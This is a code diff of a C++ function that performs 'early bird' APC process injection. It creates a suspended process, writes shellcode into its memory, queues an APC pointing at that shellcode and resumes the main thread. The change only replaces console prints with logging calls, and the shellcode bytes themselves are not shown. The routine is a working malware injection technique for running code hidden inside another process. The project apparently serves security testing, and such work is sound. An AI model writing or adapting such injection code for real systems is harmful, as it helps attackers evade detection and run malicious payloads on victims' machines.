@@ -2,22 +2,23 @@
 
 #include "sysapi.h"
 #include "scripts.h"
+#include "logging.h"
 
 namespace scripts {
 
 bool inject_queue_apc_early_bird(const std::wstring& original_image,
                                  RemoteProcessMemoryMethod memory_method) {
 
-    wprintf(L"\nPreparing a new process\n");
+    bblog::info("[*] Preparing a new process");
 
-    wprintf(L"  [*] creating process...\n");
+    bblog::info("creating process...");
 
     auto process = sysapi::ProcessCreateUser(original_image, true);
     if (process.hProcess == NULL) {
         return false;
     }
 
-    wprintf(L"\nPlacing shellcode in the target process\n");
+    bblog::info("[*] Placing shellcode in the target process");
 
     RemoteProcessMemoryContext ctx;
     bool res = process_init_memory(ctx, memory_method, process.hProcess.get(), 0);
@@ -32,21 +33,19 @@ bool inject_queue_apc_early_bird(const std::wstring& original_image,
         return false;
     }
 
-    wprintf(L"  [*] writing shellcode...\n");
+    bblog::info("writing shellcode...");
 
     res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
     if (!res) {
         return false;
     }
 
-    wprintf(L"\nQueueing APC with shellcode in main thread\n");
+    bblog::info("[*] Queueing APC with shellcode in main thread");
 
     res = sysapi::ThreadQueueUserApc(process.hThread.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
     if (!res) {
         return false;
     }
-
-    wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", process.hThread.get());
 
     // NOTE:
     // The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
@@ -55,13 +54,13 @@ bool inject_queue_apc_early_bird(const std::wstring& original_image,
     // but without suspension it will be a regular APC injection (but into a newly started process)
     // TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script
 
-    wprintf(L"  [*] resuming thread...\n");
+    bblog::info("resuming thread...");
 
     if (!ResumeThread(process.hThread.get())) {
         return false;
     }
 
-    wprintf(L"\nSuccess\n");
+    bblog::info("[+] Success");
     return true;
 }
 
